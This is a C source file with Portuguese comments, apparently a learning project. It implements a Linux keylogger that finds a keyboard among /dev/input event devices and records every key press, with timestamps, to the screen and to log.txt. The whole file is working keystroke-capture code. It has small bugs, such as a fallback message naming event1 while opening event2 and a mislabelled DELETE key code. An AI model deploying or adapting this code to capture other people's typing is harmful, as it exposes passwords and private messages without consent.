#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <string.h>
#include <sys/ioctl.h>
#include <time.h>

// tabela de teclas normais
char teclas[200] = {
    0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', 0,
    0, 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', 0,
    0, 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', 0,
    '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0, '*', 0, ' '
};

int procurar_teclado() {
    printf("Procurando teclado..\n");
    printf("------------------------\n");
    
    for(int i = 0; i <= 15; i++) {
        char caminho[50];
        sprintf(caminho, "/dev/input/event%d", i);  // testa event0 até event15
        
        int fd = open(caminho, O_RDONLY);
        if(fd != -1) {
            char nome[256] = {0};
            // tenta ler o nome do dispositivo
            if(ioctl(fd, EVIOCGNAME(sizeof(nome)), nome) != -1) {
                printf("event%d: %s\n", i, nome);
                
                // palavras chaves que possam indicar que é teclado para facilitar identificação
                if(strstr(nome, "keyboard") || strstr(nome, "Keyboard") ||
                   strstr(nome, "Key") || strstr(nome, "kbd") ||
                   strstr(nome, "AT") || strstr(nome, "Set")) {
                    printf("\n Encontrado, usando /dev/input/event%d (%s)\n", i, nome);
                    return fd;
                }
            }
            close(fd);
        }
    }
    
    // caso não achar pelo nome
    printf("Não achado pelo nome, tentando event1..\n");
    int fd = open("/dev/input/event2", O_RDONLY);
    if(fd != -1) {
        printf("Usado event2, talvez seja teclado..\n");
        return fd;
    }
    return -1;
}

// funcao pra pegar o horario
void pegar_horario(char *buffer, int tamanho) {
    time_t agora;
    struct tm *info;
    
    time(&agora);
    info = localtime(&agora);
    strftime(buffer, tamanho, "%H:%M:%S", info);
}

int main() {
    int tec = procurar_teclado();
    
    if(tec == -1) {
        printf("Não achou nada!\n");
        printf("Tenta sudo ./nome_do_progama\n");
        return 1;
    }
    
    printf("\nteclado funcionando, aperta ctrl+c pra parar\n");
    
    FILE *log = fopen("log.txt", "a");
    if(log == NULL) {
        printf("deu erro no arquivo log.txt\n");
        return 1;
    }
    
    struct input_event e;
    int shift = 0;
    
    while(1) {
        int r = read(tec, &e, sizeof(e));
        if(r < 0) {
            printf("Erro ao ler /dev");
            break;
        }
        
        // se for tecla
        if(e.type == 1) {
            // shift apertado ou solto
            if(e.code == 42 || e.code == 54) {
                if(e.value == 1) {
                    shift = 1;
                } else {
                    shift = 0;
                }
                continue;
            }
            
            // so quando aperta (value=1)
            if(e.value == 1) {
                char horario[20];
                pegar_horario(horario, sizeof(horario));
                
                // tenta converter tecla normal
                if(e.code < 128 && teclas[e.code] != 0) {
                    char letra = teclas[e.code];
                    
                    if(shift == 1 && letra >= 'a' && letra <= 'z') {
                        letra = letra - 32;
                    }
                    
                    printf("[%s] Tecla: '%c'\n", horario, letra);
                    fflush(stdout);
                    fprintf(log, "[%s] '%c'\n", horario, letra);
                }
                else {
                    // teclas especiais
                    char *nome_tecla = "";
                    // reconhecimento de teclas especiais usando ascii para identificação
                    switch(e.code) {
                        case 28:
                            nome_tecla = "ENTER";
                            printf("[%s] Tecla: ENTER\n", horario);
                            fflush(stdout);
                            break;
                        case 14:
                            nome_tecla = "BACKSPACE";
                            printf("[%s] Tecla: BACKSPACE\n", horario);
                            fflush(stdout);
                            break;
                        case 57:
                            nome_tecla = "ESPACO";
                            printf("[%s] Tecla: ESPACO\n", horario);
                            fflush(stdout);
                            break;
                        case 15:
                            nome_tecla = "TAB";
                            printf("[%s] Tecla: TAB\n", horario);
                            fflush(stdout);
                            break;
                        case 1:
                            nome_tecla = "ESC";
                            printf("[%s] Tecla: ESC\n", horario);
                            fflush(stdout);
                            break;
                        case 103:
                            nome_tecla = "SETA_CIMA";
                            printf("[%s] Tecla: SETA_CIMA\n", horario);
                            fflush(stdout);
                            break;
                        case 108:
                            nome_tecla = "SETA_BAIXO";
                            printf("[%s] Tecla: SETA_BAIXO\n", horario);
                            fflush(stdout);
                            break;
                        case 105:
                            nome_tecla = "SETA_ESQUERDA";
                            printf("[%s] Tecla: SETA_ESQUERDA\n", horario);
                            fflush(stdout);
                            break;
                        case 106:
                            nome_tecla = "SETA_DIREITA";
                            printf("[%s] Tecla: SETA_DIREITA\n", horario);
                            fflush(stdout);
                            break;
                        case 127:
                            nome_tecla = "DELETE";
                            printf("[%s] Tecla: DELETE\n", horario);
                            fflush(stdout);
                            break;
                        case 58:
                            nome_tecla = "CAPS_LOCK";
                            printf("[%s] Tecla: CAPS_LOCK\n", horario);
                            fflush(stdout);
                            break;
                        default:
                            nome_tecla = "DESCONHECIDA";
                            printf("[%s] Tecla: DESCONHECIDA[%d]\n", horario, e.code);
                            fflush(stdout);
                            break;
                    }
                    
                    fprintf(log, "[%s] %s\n", horario, nome_tecla);
                }
                
                // força escrever no arquivo
                fflush(log);
            }
        }
    }
    
    fclose(log);
    close(tec);
    return 0;
}